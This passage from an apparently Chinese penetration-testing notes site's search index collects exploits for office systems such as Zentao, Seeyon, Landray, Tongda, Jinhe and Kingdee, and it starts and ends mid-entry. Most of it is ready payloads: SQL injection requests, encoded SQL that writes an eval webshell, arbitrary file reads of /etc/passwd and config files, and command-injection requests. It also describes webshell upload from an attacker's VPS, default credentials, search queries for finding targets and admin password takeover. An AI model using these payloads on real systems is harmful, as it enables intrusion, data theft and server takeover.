\u7985\u9053\u662f\u4e00\u79cd\u5f00\u6e90\u7684\u9879\u76ee\u7ba1\u7406\u548c\u534f\u4f5c\u7cfb\u7edf\u3002\u5b83\u63d0\u4f9b\u4e86\u9879\u76ee\u7ba1\u7406\u3001\u4efb\u52a1\u7ba1\u7406\u3001\u7f3a\u9677\u8ddf\u8e2a\u3001\u6587\u6863\u7ba1\u7406\u3001\u56e2\u961f\u534f\u4f5c\u7b49\u529f\u80fd\uff0c\u53ef\u4ee5\u5e2e\u52a9\u56e2\u961f\u9ad8\u6548\u5730\u8fdb\u884c\u9879\u76ee\u7ba1\u7406\u548c\u534f\u4f5c\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_3","text":"","title":"\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#fofa","text":"https://fofa.info/result?qbase64=YXBwPSLmmJPova%2FlpKnliJst56aF6YGT57O757ufIg%3D%3D","title":"fofa"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_4","text":"","title":"\u67e5\u770b\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#api","text":"http://127.0.0.1/zentao/index.php?mode=getconfig","title":"api\u770b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#f12","text":"F12\u641c\u7d22 stylesheet","title":"F12\u770b\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_5","text":"","title":"\u5386\u53f2\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_6","text":"\u5bc6\u7801\u5747\u4e3a123456 productManager projectManager dev1 dev2 dev3 tester1 tester2 tester3 testManager \u5f53\u4f7f\u7528\u8fd9\u4e9b\u8d26\u53f7\u521d\u6b21\u767b\u5f55\u7cfb\u7edf\u65f6\uff0c\u5f39\u51fa\u7684\u4fee\u6539\u5bc6\u7801\u9875\u9762\u53ef\u80fd\u6709bug\uff0c\u9700\u8981\u81ea\u884c\u4fee\u6539\uff1a\u70b9\u51fb \u53f3\u4fa7\u5934\u50cf-\u4fee\u6539\u5bc6\u7801 \uff0c\u4fee\u6539\u6210\u529f\uff0c\u5373\u53ef\u8fdb\u5165\u7cfb\u7edf","title":"\u5f00\u6e90\u7248\u6d4b\u8bd5\u8d26\u53f7"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#180beta1rce","text":"\u7985\u9053\u7cfb\u7edf \u5f71\u54cd\u7248\u672c \u5f00\u6e90\u7248 17.4\u4ee5\u4e0b\u7684\u672a\u77e5\u7248\u672c<=version<=18.0.beta1 \u65d7\u8230\u7248 3.4\u4ee5\u4e0b\u7684\u672a\u77e5\u7248\u672c<=version<=4.0.beta1 \u4f01\u4e1a\u7248 7.4\u4ee5\u4e0b\u7684\u672a\u77e5\u7248\u672c<=version<=8.0.beta1 8.0.beta2 https://github.com/0xf4n9x/Zentao-Captcha-RCE 1.exe -u url -c whoami","title":"18.0.beta1\u6743\u9650\u7ed5\u8fc7+\u547d\u4ee4\u6ce8\u5165rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#165-sql","text":"\u62a5\u9519\u6ce8\u5165 POST /user-login.html HTTP/1.1 Host: 172.16.1.8 Content-Length: 189 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://172.16.1.8 Referer: http://172.16.1.8/user-login-Lw==.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close account=aaa' and updatexml(1,concat(0x7e,(database()),0x7e),1) and '1'='1&password=b1663c937c5c84c38568ef381912c740&passwordStrength=0&referer=%2F&verifyRand=1090667403&keepLogin=0&captcha=","title":"\u7985\u905316.5 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#1242","text":"\u5148\u901a\u8fc7ftp\u5728\u81ea\u5df1vps\u4f20\u4e2a\u9a6c ftp://192.168.5.104/a.php \u7136\u540e\u628a\u8fd9\u4e2a\u94fe\u63a5base64\u52a0\u5bc6\uff0c\u653e\u5165\u4e0b\u9762\u8fd9\u4e2a\u94fe\u63a5\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20 http://127.0.0.1/zentao/client-download-1-(base64 encode webshelldownload link)-1.html \u7136\u540e\u8bbf\u95ee\u5373\u53ef http://127.0.0.1/zentao/data/client/1/a.php","title":"12.4.2\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#116xss","text":"","title":"11.6\u540e\u53f0\u5b58\u50a8xss"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#116sql","text":"http://www.0-sec.org/zentaopms_11.6/www/api-getModel-user-getRealNameAndEmails-users=admin http://www.0-sec.org/zentaopms_11.6/www/api-getModel-api-sql-sql=select+account,password+from+zt _user","title":"11.6\u540e\u53f0sql\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#116","text":"http://www.0-sec.org/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd","title":"11.6 \u6587\u4ef6\u5305\u542b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#116rce","text":"\u5199\u6587\u4ef6 POST /api-getModel-editor-save-filePath=/tmp/shell.php fileContent=<?php phpinfo();?> \u5305\u542b\u6587\u4ef6 http://127.0.0.1/api-getModel-api-getMethod-filePath=/tmp/shell/1","title":"11.6\u6587\u4ef6\u4e0a\u4f20+\u6587\u4ef6\u5305\u542b\u2192rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#1242_1","text":"index.php?m=file&f=sendDownHeader&fileName=2&fileType=1&content=/etc/passwd&type=file index.php?m=file&f=sendDownHeader&fileName=2&fileType=1&content=./../../config/my.php&type=file index.php?m=im&f=downloadXxdPackage&xxdFileName=../../../../../../../../../etc/passwd","title":"12.4.2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6&amp;\u4e0b\u8f7d"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#pro","text":"client\u53c2\u6570\u8fdb\u884c\u547d\u4ee4\u6267\u884c POST /repo-create.html SCM=Git&name=test2&path=C%3A%5CProgramData&encoding=utf-8&client=whoami","title":"pro\u4efb\u610f\u7248\u672c\u547d\u4ee4\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#82-921-sqlshell","text":"\u968f\u4fbf\u8f93\u8def\u7531\u4f1a\u7206\u7edd\u5bf9\u8def\u5f84 \u5982\u679c\u6ca1\u62a5\u9519\uff0c\u5c31\u7528\u8fd9\u4e2apayload {\"orderBy\":\"order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#\",\"num\":\"1,1\",\"type\":\"openedbyme\"} base64\u8f6c\u5316 eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= base64\u5b57\u7b26\u653e\u5165param\u53c2\u6570 http://127.0.0.1:81/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=base64 into outfile \u5199shell select '<?php phpinfo();?>' into outfile 'C:/Users/Administrator/Desktop/xampp/zentao/www/test.php' 73656c65637420273c3f70687020706870696e666f28293b3f3e2720696e746f206f757466696c652027433a2f55736572732f41646d696e6973747261746f722f4465736b746f702f78616d70702f7a656e74616f2f7777772f746573742e70687027 \u4e0a\u9762\u8fd9\u4e2a\u65b9\u6cd5\u5982\u679c\u4e0d\u80fd\u5199\uff0c\u53ef\u4ee5\u7528\u5982\u4e0b\u65b9\u5f0f\u5c1d\u8bd5bypass select '<?php @eval($_POST[x])?>' into outfile 'D:/zentao/xampp/zentao/www/hack.php' hex\u7f16\u7801\uff08\u6ce8\u610f\u52a0\u5bc6\u89e3\u5bc6\u90fd\u4e0d\u5e260x\uff0c\u4f46\u662fEXP\u4e2d\u9700\u8981\u52a0\u4e0a\uff09 73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027 payload\u539f\u578b {\"orderBy\":\"order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -\",\"num\":\"1,1\",\"type\":\"openedbyme\"} base64\u52a0\u5bc6 eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzQ0M0EyRjdBNjU2RTc0NjE2RjJGNzg2MTZENzA3MDJGN0E2NTZFNzQ2MTZGMkY3Nzc3NzcyRjY4NjE2MzZCMkU3MDY4NzAyNztQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==","title":"8.2-9.2.1 \u4f4e\u7248\u672c\u524d\u53f0SQL\u6ce8\u5165\u5199shell"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_7","text":"","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_8","text":"ip/my-team.html","title":"\u83b7\u53d6\u7ec4\u7ec7\u67b6\u6784"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_9","text":"zentao \u5e93\uff0c zt_user \u8868 password\u5b57\u6bb5\uff08\u88abmd5\u52a0\u5bc6\uff09\u548caccount\u5b57\u6bb5 \u6539\u7ba1\u7406\u5458\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\uff0cpassword\u9700md5\u52a0\u5bc6 update zt_user SET password='10685fcd8e87988b0b02ac12d3f0ae88' where id=1;","title":"\u6570\u636e\u5e93\u4e2d\u7684\u8d26\u6237\u5bc6\u7801\u4f4d\u7f6e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#getshell","text":"\u540e\u53f0\u2192\u63d2\u4ef6\uff0cadmin\u624d\u80fd\u88c5\uff0c\u4f46\u662f\u53ef\u80fd\u70b9\u51fb\u63d2\u4ef6\u540e\uff0c\u63d0\u793a\u5fc5\u987b\u5728\u673a\u5668\u4e0a\u521b\u5efa\u4e00\u4e2a\u7279\u5b9a\u6587\u4ef6\u624d\u80fd\u88c5\u63d2\u4ef6\uff08\u9a8c\u8bc1admin\u8eab\u4efd\uff09\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c31\u6ca1\u529e\u6cd5\u4e86 \u6709\u53ef\u80fd\u6709\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u7684\u63d2\u4ef6\u3002","title":"\u88c5\u63d2\u4ef6getshell"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/","text":"\u81f4\u8fdc \u76ee\u5f55 \u7248\u672c\u67e5\u770b \u6f0f\u6d1e \u4efb\u610f\u7528\u6237\u767b\u5f55 \u7248\u672c\u67e5\u770b 5.1SP1\u2014 6.1SP2\u7248\u672c 1.\u8f93\u5165 http://\u5730\u5740\u548c\u7aef\u53e3/seeyon/main.do?method=showAbout \u6216\u8005\u5f00\u53d1\u8005\u5de5\u5177 \u6f0f\u6d1e https://www.hacking8.com/bug-web/\u81f4\u8fdcoa/\u81f4\u8fdcOA-A8-\u672a\u6388\u6743\u8bbf\u95ee.html \u4efb\u610f\u7528\u6237\u767b\u5f55 POST /seeyon/thirdpartyController.do HTTP/1.1 method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1","title":"\u81f4\u8fdc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/#_1","text":"","title":"\u81f4\u8fdc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/#_2","text":"\u7248\u672c\u67e5\u770b \u6f0f\u6d1e \u4efb\u610f\u7528\u6237\u767b\u5f55","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/#_3","text":"5.1SP1\u2014 6.1SP2\u7248\u672c 1.\u8f93\u5165 http://\u5730\u5740\u548c\u7aef\u53e3/seeyon/main.do?method=showAbout \u6216\u8005\u5f00\u53d1\u8005\u5de5\u5177","title":"\u7248\u672c\u67e5\u770b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/#_4","text":"https://www.hacking8.com/bug-web/\u81f4\u8fdcoa/\u81f4\u8fdcOA-A8-\u672a\u6388\u6743\u8bbf\u95ee.html","title":"\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/#_5","text":"POST /seeyon/thirdpartyController.do HTTP/1.1 method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1","title":"\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/","text":"\u84dd\u51cc \u76ee\u5f55 \u63a2\u6d4b hunter \u84dd\u51ccOA\u524d\u53f0\u4ee3\u7801\u6267\u884c \u63a2\u6d4b hunter oa app.name=\"Landray \u84dd\u51ccOA\" \u84dd\u51ccOA\u524d\u53f0\u4ee3\u7801\u6267\u884c POC EXP POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: [www.ynjd.cn:801](http://www.ynjd.cn:801) User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: */* Connection: Keep-Alive Content-Length: 42 Content-Type: application/x-www-form-urlencoded var={\"body\":{\"file\":\"file:///etc/passwd\"}}","title":"\u84dd\u51cc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/#_1","text":"","title":"\u84dd\u51cc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/#_2","text":"\u63a2\u6d4b hunter \u84dd\u51ccOA\u524d\u53f0\u4ee3\u7801\u6267\u884c","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/#_3","text":"","title":"\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/#hunter","text":"oa app.name=\"Landray \u84dd\u51ccOA\"","title":"hunter"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/#oa","text":"POC EXP POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: [www.ynjd.cn:801](http://www.ynjd.cn:801) User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: */* Connection: Keep-Alive Content-Length: 42 Content-Type: application/x-www-form-urlencoded var={\"body\":{\"file\":\"file:///etc/passwd\"}}","title":"\u84dd\u51ccOA\u524d\u53f0\u4ee3\u7801\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BE/","text":"\u901a\u8fbe \u76ee\u5f55 \u7248\u672c\u63a2\u6d4b \u901a\u8fbeOA\uff08CVE-2023-4166\uff09 \u7248\u672c\u63a2\u6d4b /inc/expired.php \u901a\u8fbeOA\uff08CVE-2023-4166\uff09 sql\u6ce8\u5165 \u63cf\u8ff0-\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA \u662f\u7531\u5317\u4eac\u901a\u8fbe\u4fe1\u79d1\u79d1\u6280\u6709\u9650\u516c\u53f8\u81ea\u4e3b\u7814\u53d1\u7684\u534f\u540c\u529e\u516c\u81ea\u52a8\u5316\u8f6f\u4ef6\uff0c\u662f\u9002\u5408\u5404\u4e2a\u884c\u4e1a\u7528\u6237\u7684\u7efc\u5408\u7ba1\u7406\u529e\u516c\u5e73\u53f0 \u672c\u6b21\u8303\u56f4\uff1a\u901a\u8fbeOA\u7248\u672c11.10\u4e4b\u524d POC \u03c0 GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1 Host: 192.168.232.137:8098 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46 Upgrade-Insecure-Requests: 1","title":"\u901a\u8fbe"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BE/#_1","text":"","title":"\u901a\u8fbe"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BE/#_2","text":"\u7248\u672c\u63a2\u6d4b \u901a\u8fbeOA\uff08CVE-2023-4166\uff09","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BE/#_3","text":"/inc/expired.php","title":"\u7248\u672c\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BE/#oacve-2023-4166","text":"sql\u6ce8\u5165 \u63cf\u8ff0-\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA \u662f\u7531\u5317\u4eac\u901a\u8fbe\u4fe1\u79d1\u79d1\u6280\u6709\u9650\u516c\u53f8\u81ea\u4e3b\u7814\u53d1\u7684\u534f\u540c\u529e\u516c\u81ea\u52a8\u5316\u8f6f\u4ef6\uff0c\u662f\u9002\u5408\u5404\u4e2a\u884c\u4e1a\u7528\u6237\u7684\u7efc\u5408\u7ba1\u7406\u529e\u516c\u5e73\u53f0 \u672c\u6b21\u8303\u56f4\uff1a\u901a\u8fbeOA\u7248\u672c11.10\u4e4b\u524d POC \u03c0 GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1 Host: 192.168.232.137:8098 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46 Upgrade-Insecure-Requests: 1","title":"\u901a\u8fbeOA\uff08CVE-2023-4166\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E5%92%8C/%E9%87%91%E5%92%8C/","text":"\u91d1\u548c \u91d1\u548cOA C6-GetSgIData.aspx SQL\u6ce8\u5165\u6f0f\u6d1e POST /c6/Contro/GetSglData.aspx/.ashx Host: ip.port User-Agent: Mozillal5.0 (Windows NT 5.1) AppleWebkit/537.36(KHTML\uff0c like Gecko) Chrome/35.0.2117.157 Safari/537 36 Connection: close Content-Length.189 Content-Type. text/plain Accept-Encoding: gzip exec master..xp cmdshell 'ipconfig'","title":"\u91d1\u548c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E5%92%8C/%E9%87%91%E5%92%8C/#_1","text":"","title":"\u91d1\u548c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E5%92%8C/%E9%87%91%E5%92%8C/#oa-c6-getsgidataaspx-sql","text":"POST /c6/Contro/GetSglData.aspx/.ashx Host: ip.port User-Agent: Mozillal5.0 (Windows NT 5.1) AppleWebkit/537.36(KHTML\uff0c like Gecko) Chrome/35.0.2117.157 Safari/537 36 Connection: close Content-Length.189 Content-Type. text/plain Accept-Encoding: gzip exec master..xp cmdshell 'ipconfig'","title":"\u91d1\u548cOA C6-GetSgIData.aspx SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/","text":"\u91d1\u8776 \u76ee\u5f55 \u91d1\u8776\u4e91\u661f\u7a7a \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6CommonsFileServer \u91d1\u8776 \u91d1\u8776\u4e91\u661f\u7a7a \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6CommonsFileServer GET /CommonFileServer/c:/windows/win.ini \u91d1\u8776","title":"\u91d1\u8776"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/#_1","text":"","title":"\u91d1\u8776"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/#_2","text":"\u91d1\u8776\u4e91\u661f\u7a7a \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6CommonsFileServer 